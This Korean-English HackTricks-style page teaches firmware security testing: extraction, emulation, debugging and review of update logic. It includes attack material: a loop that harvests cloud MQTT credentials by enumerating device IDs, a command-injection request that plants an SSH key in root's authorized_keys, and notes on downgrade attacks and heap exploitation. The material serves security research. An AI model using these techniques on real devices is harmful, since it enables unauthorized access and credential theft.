# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware는 기기가 하드웨어 구성 요소와 사용자가 상호작용하는 소프트웨어 사이의 통신을 관리하고 촉진함으로써 올바르게 동작할 수 있게 해주는 필수 소프트웨어입니다. 이는 영구 메모리에 저장되어, 전원이 켜지는 순간부터 장치가 중요한 지침에 접근할 수 있게 하며, 그 결과 operating system의 시작으로 이어집니다. firmware를 검토하고 필요할 경우 수정하는 것은 security vulnerabilities를 식별하는 데 중요한 단계입니다.

## **Gathering Information**

**Gathering information**은 기기의 구성과 그것이 사용하는 기술을 이해하기 위한 중요한 초기 단계입니다. 이 과정은 다음에 대한 데이터를 수집하는 것을 포함합니다:

- CPU architecture와 그것이 실행하는 operating system
- Bootloader 세부 사항
- 하드웨어 레이아웃과 datasheets
- codebase 메트릭과 소스 위치
- 외부 라이브러리와 license 유형
- 업데이트 이력과 규제 인증
- 아키텍처 및 흐름 다이어그램
- Security assessments와 식별된 vulnerabilities

이 목적을 위해 **open-source intelligence (OSINT)** 도구는 매우 유용하며, 사용 가능한 모든 open-source software 구성 요소에 대한 수동 및 자동 검토 과정도 마찬가지로 중요합니다. [Coverity Scan](https://scan.coverity.com) 및 [Semmle’s LGTM](https://lgtm.com/#explore) 같은 도구는 잠재적 문제를 찾는 데 활용할 수 있는 무료 static analysis를 제공합니다.

## **Acquiring the Firmware**

firmware를 얻는 방법은 여러 가지가 있으며, 각각 복잡성 수준이 다릅니다:

- **직접** 소스에서 (developers, manufacturers)
- 제공된 지침에 따라 **build**하기
- 공식 support site에서 **download**하기
- 호스팅된 firmware 파일을 찾기 위해 **Google dork** 쿼리 활용하기
- [S3Scanner](https://github.com/sa7mon/S3Scanner) 같은 도구로 **cloud storage**에 직접 접근하기
- man-in-the-middle 기법으로 **updates** 가로채기
- **UART**, **JTAG**, 또는 **PICit** 같은 연결을 통해 장치에서 **extracting**하기
- 장치 통신 내에서 update 요청을 **sniffing**하기
- **hardcoded update endpoints**를 식별하고 사용하기
- bootloader 또는 network에서 **dumping**하기
- 다른 방법이 모두 실패할 경우, 적절한 hardware tools를 사용해 storage chip을 **제거하고 읽기**

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## Analyzing the firmware

이제 **firmware를 확보했으므로**, 어떻게 다룰지 알기 위해 그에 대한 정보를 추출해야 합니다. 이를 위해 사용할 수 있는 다양한 도구:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
If you don't find much with those tools check the **entropy** of the image with `binwalk -E <bin>`, if low entropy, then it's not likely to be encrypted. If high entropy, Its likely encrypted (or compressed in some way).

Moreover, you can use these tools to extract **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) to inspect the file.

### Getting the Filesystem

With the previous commented tools like `binwalk -ev <bin>` you should have been able to **extract the filesystem**.\
Binwalk usually extracts it inside a **folder named as the filesystem type**, which usually is one of the following: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Sometimes, binwalk will **not have the magic byte of the filesystem in its signatures**. In these cases, use binwalk to **find the offset of the filesystem and carve the compressed filesystem** from the binary and **manually extract** the filesystem according to its type using the steps below.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
dd 명령을 실행하여 Squashfs 파일시스템을 carving하세요.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
또는 다음 명령도 실행할 수 있습니다.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs의 경우 (위 예제에서 사용됨)

`$ unsquashfs dir.squashfs`

이후 파일들은 "`squashfs-root`" 디렉터리에 있습니다.

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems의 경우

`$ jefferson rootfsfile.jffs2`

- NAND flash를 사용하는 ubifs filesystems의 경우

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 펌웨어 분석

펌웨어를 확보한 후에는 그 구조와 잠재적 취약점을 이해하기 위해 이를 분해하는 것이 중요합니다. 이 과정에서는 다양한 도구를 활용해 펌웨어 이미지에서 유용한 데이터를 분석하고 추출합니다.

### 초기 분석 도구

바이너리 파일(`<bin>`)을 처음 살펴보기 위한 명령 세트가 제공됩니다. 이 명령들은 file type을 식별하고, strings를 추출하고, binary data를 분석하며, partition과 filesystem 세부 정보를 파악하는 데 도움을 줍니다:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
이미지의 암호화 상태를 평가하려면 `binwalk -E <bin>`으로 **entropy**를 확인합니다. 낮은 entropy는 암호화가 없을 가능성을 시사하고, 높은 entropy는 암호화 또는 압축 가능성을 나타냅니다.

**embedded files**를 추출하기 위해서는 **file-data-carving-recovery-tools** 문서와 파일 검사용 **binvis.io** 같은 도구와 리소스가 권장됩니다.

### 파일시스템 추출

`binwalk -ev <bin>`을 사용하면 일반적으로 파일시스템을 추출할 수 있으며, 보통 파일시스템 유형에 따라 이름이 붙은 디렉터리로 추출됩니다(예: squashfs, ubifs). 그러나 **binwalk**가 magic bytes가 없어서 파일시스템 유형을 인식하지 못하면 수동 추출이 필요합니다. 이 과정은 `binwalk`로 파일시스템의 offset을 찾은 다음, `dd` 명령으로 파일시스템을 carve out하는 방식입니다:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
이후에는 파일시스템 유형(e.g., squashfs, cpio, jffs2, ubifs)에 따라 내용을 수동으로 추출하기 위해 다른 commands가 사용된다.

### Filesystem Analysis

filesystem이 추출되면 security flaws를 찾기 시작한다. insecure network daemons, hardcoded credentials, API endpoints, update server 기능, uncompiled code, startup scripts, 그리고 offline analysis를 위한 compiled binaries에 주의한다.

**Key locations** 및 **items**로는 다음을 점검한다:

- 사용자 credentials를 위한 **etc/shadow** 및 **etc/passwd**
- **etc/ssl**의 SSL certificates와 keys
- 잠재적 vulnerabilities가 있는 configuration 및 script files
- 추가 분석을 위한 embedded binaries
- 일반적인 IoT device web servers 및 binaries

여러 tools가 filesystem 내의 sensitive information과 vulnerabilities를 찾는 데 도움을 준다:

- sensitive information 검색용 [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 및 [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 포괄적인 firmware analysis를 위한 [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static and dynamic analysis를 위한 [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), 및 [**EMBA**](https://github.com/e-m-b-a/emba)

### Security Checks on Compiled Binaries

filesystem에서 발견되는 source code와 compiled binaries 모두 vulnerabilities를 위해 면밀히 검토해야 한다. **checksec.sh** 같은 Unix binaries용 tool과 **PESecurity** 같은 Windows binaries용 tool은 악용될 수 있는 unprotected binaries를 식별하는 데 도움이 된다.

## Harvesting cloud config and MQTT credentials via derived URL tokens

많은 IoT hubs는 각 device의 configuration을 다음과 유사한 cloud endpoint에서 가져온다:

- `https://<api-host>/pf/<deviceId>/<token>`

firmware analysis 중에 `<token>`이 hardcoded secret을 사용해 device ID로부터 local하게 생성된다는 것을 발견할 수 있다. 예를 들어:

- token = MD5( deviceId || STATIC_KEY ) 이고 uppercase hex로 표현됨

이 설계는 deviceId와 STATIC_KEY를 알아낸 누구나 URL을 재구성해 cloud config를 가져올 수 있게 하며, 종종 plaintext MQTT credentials와 topic prefixes를 드러낸다.

실용적인 workflow:

1) UART boot logs에서 deviceId 추출

- 3.3V UART adapter (TX/RX/GND)를 연결하고 logs를 캡처한다:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URL pattern과 broker address를 출력하는 줄을 찾아보세요. 예:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware에서 STATIC_KEY와 token algorithm 복구

- binaries를 Ghidra/radare2에 로드하고 config path ("/pf/") 또는 MD5 usage를 검색한다.
- algorithm을 확인한다. (예: MD5(deviceId||STATIC_KEY)).
- Bash에서 token을 도출하고 digest를 대문자로 변환한다:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config와 MQTT credentials 수집

- URL을 구성하고 curl로 JSON을 가져온 다음, jq로 파싱해 secrets를 추출:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT 및 weak topic ACLs 악용하기(존재하는 경우)

- 복구한 credentials를 사용해 maintenance topics에 subscribe하고, 민감한 events를 찾아보세요:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 예측 가능한 device ID 열거하기 (대규모로, 허가 하에)

- 많은 ecosystem은 vendor OUI/product/type 바이트 뒤에 순차적인 suffix를 붙입니다.
- candidate ID를 반복하고, token을 derive한 뒤, configs를 programmatically fetch할 수 있습니다:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- 대량 열거를 시도하기 전에 항상 명시적 허가를 받으세요.
- 가능한 경우, 대상 하드웨어를 수정하지 않고 secrets를 복구하기 위해 emulation 또는 static analysis를 우선하세요.


firmware를 emulating하는 과정은 장치의 동작 또는 개별 프로그램에 대한 **dynamic analysis**를 가능하게 합니다. 이 접근 방식은 hardware 또는 architecture 종속성으로 인해 어려움에 직면할 수 있지만, root filesystem 또는 특정 binaries를 일치하는 architecture와 endianness를 가진 장치, 예를 들어 Raspberry Pi, 또는 미리 구성된 virtual machine으로 옮기면 추가 testing을 쉽게 할 수 있습니다.

### 개별 Binaries Emulating하기

단일 프로그램을 검토할 때는 프로그램의 endianness와 CPU architecture를 식별하는 것이 중요합니다.

#### MIPS Architecture 예시

MIPS architecture binary를 emulating하려면, 다음 command를 사용할 수 있습니다:
```bash
file ./squashfs-root/bin/busybox
```
그리고 필요한 에뮬레이션 도구를 설치하려면:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dynamic Analysis in Practice

At this stage, either a real or emulated device environment is used for analysis. It's essential to maintain shell access to the OS and filesystem. Emulation may not perfectly mimic hardware interactions, necessitating occasional emulation restarts. Analysis should revisit the filesystem, exploit exposed webpages and network services, and explore bootloader vulnerabilities. Firmware integrity tests are critical to identify potential backdoor vulnerabilities.

## Runtime Analysis Techniques

Runtime analysis involves interacting with a process or binary in its operating environment, using tools like gdb-multiarch, Frida, and Ghidra for setting breakpoints and identifying vulnerabilities through fuzzing and other techniques.

For embedded targets without a full debugger, **copy a statically-linked `gdbserver`** to the device and attach remotely:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hubs에서 RF stack은 종종 **radio MCU**와 Linux userland process 사이에 분리되어 있다. 유용한 워크플로우는 다음 경로를 매핑하는 것이다:

1. 공기 중의 **RF frame**
2. radio MCU에서의 **controller-side parser**
3. Linux로 전달되는 **serial/UART text or TLV protocol** (예: `/dev/tty*`)
4. main daemon의 **application dispatcher**
5. **protocol-specific handler / state machine**

이 아키텍처는 하나 대신 두 개의 reversing target을 만든다. controller가 binary radio frames를 `Group,Command,arg1,arg2,...` 같은 textual protocol로 변환한다면, 다음을 복구하라:

- **message groups**와 dispatch tables
- 어떤 메시지가 **network**에서 오고 어떤 메시지가 controller 자체에서 오는지
- 정확한 **manufacturer-specific discriminator fields** (예: Zigbee `manufacturer_code`와 custom `cluster_command`)
- 어떤 handler가 **commissioning**, discovery, 또는 firmware/model download phase에서만 도달 가능한지

Zigbee의 경우, pairing traffic을 캡처하고 대상이 여전히 기본 **Link Key** `ZigBeeAlliance09`에 의존하는지 확인하라. 그렇다면 commissioning traffic을 sniffing하면 **Network Key**가 노출될 수 있다. Zigbee 3.0 install codes는 이 노출을 줄이므로, 테스트한 device가 실제로 이를 강제하는지 기록하라.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands는 표준화된 clusters보다 더 나은 target인 경우가 많다. 왜냐하면 이들은 **custom parsing code**와 내부 **FSMs**를 더 적은 검증으로 통과시키기 때문이다.

실용적인 워크플로우:

- command dispatcher를 reverse해서 **vendor-only handler**를 찾는다.
- **FSM state**, **event**, **check**, **action**, **next-state** tables를 복구한다.
- 자동으로 진행되는 **transitional states**와 결국 공격자가 제어한 state를 reset하거나 free하는 retry/error branch를 식별한다.
- buggy handler가 항상 reachable하다고 가정하지 말고, vulnerable state로 daemon을 넣기 위해 필요한 정상 protocol exchange가 무엇인지 확인한다.

timing-sensitive protocol의 경우, Python framework에서 packet replay를 하면 너무 느릴 수 있다. 더 신뢰할 수 있는 접근은 실제 hardware에서 vendor-grade stack을 사용하는 legitimate device를 emulate하는 것이다(예: **nRF52840**). 그러면 올바른 **endpoints**, **attributes**, commissioning timing을 노출할 수 있다.

### Fragmented-download bug class in embedded daemons

반복적으로 나타나는 firmware bug class는 **fragmented blob/model/configuration downloads**에서 보인다:

1. **첫 fragment** (`offset == 0`)가 `ctx->total_size`를 저장하고 `malloc(total_size)`를 할당한다.
2. 이후 fragment는 공격자가 제어하는 **packet-local** field, 예를 들어 `packet_total_size >= offset + chunk_len`만 검증한다.
3. copy는 **원래 할당된 크기**를 확인하지 않고 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`를 사용한다.

이로 인해 공격자는 다음을 보낼 수 있다:

- 작은 declared total size를 가진 첫 번째 유효 fragment로 작은 heap allocation을 강제.
- **expected offset**을 가진 더 큰 `chunk_len`의 이후 fragment.
- 새 검사를 만족하면서도 원래 할당된 buffer를 overflow하는 forged packet-local size.

취약한 경로가 commissioning logic 뒤에 있다면, exploitation은 잘못된 fragment를 보내기 전에 대상이 예상된 model-download 또는 blob-download state로 들어가도록 충분한 **device emulation**을 포함해야 한다.

### Protocol-driven `free()` triggers

embedded daemons에서는 heap metadata exploitation을 트리거하는 가장 쉬운 방법이 종종 "cleanup을 기다리기"가 아니라 **protocol의 자체 error handling을 강제하는 것**이다:

- 잘못된 follow-up fragment를 보내 FSM을 **retry** 또는 **error** state로 몰아넣는다.
- retry threshold를 초과시켜 daemon이 **reset context**하고 손상된 buffer를 free하게 만든다.
- 이 예측 가능한 `free()`를 사용해, 다른 이유로 process가 crash되기 전에 allocator-side primitive를 트리거한다.

이는 특히 embedded Linux의 **musl/uClibc/dlmalloc-like** allocator에 유용하다. chunk metadata를 손상시키면 unlink/unbin logic을 write primitive로 바꿀 수 있기 때문이다. 안정적인 패턴은 real bin pointer를 즉시 덮어써서 process를 crash시키는 대신, **size field**를 손상시켜 allocator traversal을 overflowed buffer 안에 배치한 **fake chunks**로 리다이렉트하는 것이다.

## Binary Exploitation and Proof-of-Concept

식별된 vulnerability에 대한 PoC를 개발하려면 target architecture에 대한 깊은 이해와 저수준 언어 프로그래밍이 필요하다. embedded system의 binary runtime protection은 드물지만, 존재한다면 Return Oriented Programming (ROP) 같은 기법이 필요할 수 있다.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc는 glibc와 유사한 fastbin을 사용한다. 이후의 큰 allocation이 `__malloc_consolidate()`를 트리거할 수 있으므로, fake chunk는 검사(sane size, `fd = 0`, 그리고 주변 chunks가 "in use"로 보이는 상태)를 통과해야 한다.
- **ASLR 아래의 non-PIE binaries:** ASLR이 활성화되어 있어도 main binary가 **non-PIE**라면, binary 내부의 `.data/.bss` 주소는 고정된다. 이미 유효한 heap chunk header처럼 보이는 region을 target으로 삼아 fastbin allocation을 **function pointer table** 위에 착지시킬 수 있다.
- **Parser-stopping NUL:** JSON이 파싱될 때 payload의 `\x00`는 parsing을 멈추게 하면서, 뒤쪽의 공격자 제어 bytes를 stack pivot/ROP chain에 남길 수 있다.
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()`, `write()`를 호출하는 ROP chain은 알려진 mapping에 executable shellcode를 심고 그곳으로 점프할 수 있다.

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos)와 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 같은 operating system은 필요한 tools를 갖춘 firmware security testing용 pre-configured environment를 제공한다.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS는 Internet of Things (IoT) devices에 대한 security assessment와 penetration testing을 수행하도록 돕기 위한 distro이다. 필요한 모든 tools가 로드된 pre-configured environment를 제공하여 많은 시간을 절약해준다.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tools가 사전 설치된 Ubuntu 18.04 기반의 embedded security testing operating system이다.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

vendor가 firmware images에 대해 cryptographic signature checks를 구현하더라도, **version rollback (downgrade) protection**은 자주 생략된다. boot- 또는 recovery-loader가 embedded public key로 signature만 검증하고, flash되는 image의 *version* (또는 monotonic counter)을 비교하지 않으면, 공격자는 유효한 signature를 여전히 가진 **더 오래된, 취약한 firmware**를 정당하게 설치해 패치된 vulnerability를 다시 도입할 수 있다.

일반적인 attack workflow:

1. **서명된 오래된 image를 확보**
* vendor의 public download portal, CDN 또는 support site에서 가져온다.
* companion mobile/desktop application에서 추출한다(예: Android APK의 `assets/firmware/` 내부).
* VirusTotal, Internet archives, forums 등 third-party repository에서 가져온다.
2. 노출된 update channel을 통해 device에 image를 **upload 또는 serve**
* Web UI, mobile-app API, USB, TFTP, MQTT 등.
* 많은 consumer IoT devices는 Base64-encoded firmware blobs를 받는 *unauthenticated* HTTP(S) endpoints를 노출하며, 서버 측에서 decode한 뒤 recovery/upgrade를 트리거한다.
3. downgrade 후, 더 최신 release에서 패치된 vulnerability를 exploit한다(예: 나중에 추가된 command-injection filter).
4. 필요하다면 최신 image를 다시 flash하거나 updates를 disable하여 persistence 획득 후 탐지를 피한다.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
취약한(다운그레이드된) firmware에서는 `md5` 파라미터가 sanitisation 없이 shell command에 직접 연결되어, 임의 command injection이 가능하다(여기서는 SSH key 기반 root access 활성화). 이후 firmware 버전에서는 기본적인 character filter가 도입되었지만, downgrade protection이 없어서 이 수정은 무의미하다.

### Mobile Apps에서 Firmware 추출하기

많은 vendor는 장치가 Bluetooth/Wi-Fi를 통해 업데이트할 수 있도록 companion mobile applications 안에 전체 firmware images를 함께 번들로 넣는다. 이러한 패키지는 보통 APK/APEX 내부의 `assets/fw/` 또는 `res/raw/` 같은 경로에 암호화되지 않은 상태로 저장된다. `apktool`, `ghidra`, 또는 단순한 `unzip` 같은 도구를 사용하면 물리적 hardware에 손대지 않고도 signed images를 추출할 수 있다.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot designs에서 updater-only anti-rollback bypass

일부 vendor는 anti-downgrade **ratchet**를 구현하지만, 그것을 *updater* 로직 내부에만 둡니다(예: CAN over UDS routine, recovery command, 또는 userspace OTA agent). 이후 **bootloader**가 이미지 signature/CRC만 확인하고 partition table이나 slot metadata를 신뢰하면, rollback protection은 여전히 우회될 수 있습니다.

전형적인 취약한 설계:

- Firmware metadata에 version descriptor와 **security ratchet** / monotonic counter가 모두 포함됨.
- Updater는 image ratchet를 persistent storage에 저장된 값과 비교해, 더 오래된 signed image를 거부함.
- Bootloader는 그 ratchet를 **파싱하지 않고**, 부팅 전에 header, CRC, signature만 검증함.
- Slot activation은 partition table 또는 per-slot generation counter에 별도로 저장되며, 검증된 정확한 firmware digest에 **cryptographically bound**되지 않음.

이로 인해 dual-slot 시스템에서 **validate-one-image / boot-another-image** primitive가 생깁니다. 공격자가 updater로 current signed image를 사용해 slot B를 다음 boot target으로 표시하게 만들고, 이후 reboot 전에 slot B를 덮어쓸 수 있다면, bootloader는 이미 커밋된 slot metadata만 신뢰하므로 downgraded image를 여전히 부팅할 수 있습니다.

흔한 abuse pattern:

1. passive slot에 **current signed** firmware를 업로드하고 정상 validation/switch routine을 실행하여, 해당 slot이 next active로 표시되게 함.
2. **아직 reboot하지 않음**. 같은 session에서 slot-preparation/erase routine을 다시 진입함.
3. stale boot-state 또는 stale slot-selection logic을 악용해, updater가 방금 promoted된 **같은 physical slot**을 erase하게 만듦.
4. 그 slot에 **더 오래된 but still signed** firmware를 씀.
5. ratchet을 강제하는 validation routine을 건너뛰고 직접 reboot함.
6. bootloader가 promoted slot을 선택하고, signature/integrity만 검증한 뒤 old image를 부팅함.

A/B update implementations를 reversing할 때 확인할 사항:

- 성공적인 switch 이후에도 갱신되지 않는 **boot-time flags**에서 파생되는 slot selection.
- **current committed layout** 대신 stale state를 기준으로 slot을 erase하는 `prepare_passive_slot()`-style routine.
- validated image hash를 저장하지 않고, **generation counter** / active flag만 올리는 `part_write_layout()`-style function.
- ratchet check가 userspace 또는 updater code에 구현되어 있지만, ROM / bootloader / secure boot stages에는 **없음**.
- erase 또는 recovery routine이 content가 제거되고 다시 써진 뒤에도 slot을 bootable로 유지함.

### Update Logic 평가용 Checklist

* *update endpoint*의 transport/authentication이 충분히 보호되는가(TLS + authentication)?
* device가 flashing 전에 **version number** 또는 **monotonic anti-rollback counter**를 비교하는가?
* image가 secure boot chain 내부에서 검증되는가(예: ROM code가 signature를 확인)?
* **bootloader가 updater와 같은 ratchet**을 강제하는가, 아니면 signature/CRC만 확인하는가?
* slot activation metadata가 **validated firmware digest/version에 bound**되어 있는가, 아니면 promotion 후 slot을 수정할 수 있는가?
* slot switch가 성공한 뒤 device가 반드시 reboot되거나, 같은 session에서 이후 update/erase routine이 여전히 reachable한가?
* userland code가 추가 sanity checks(예: allowed partition map, model number)를 수행하는가?
* *partial* 또는 *backup* update flow가 같은 validation logic을 재사용하는가?

> 💡  위 항목 중 하나라도 빠져 있다면, 해당 platform은 rollback attacks에 취약할 가능성이 높습니다.

## 연습용 vulnerable firmware

firmware에서 vulnerability를 찾아보는 연습을 위해, 다음 vulnerable firmware 프로젝트를 시작점으로 사용하세요.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 훈련 및 Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
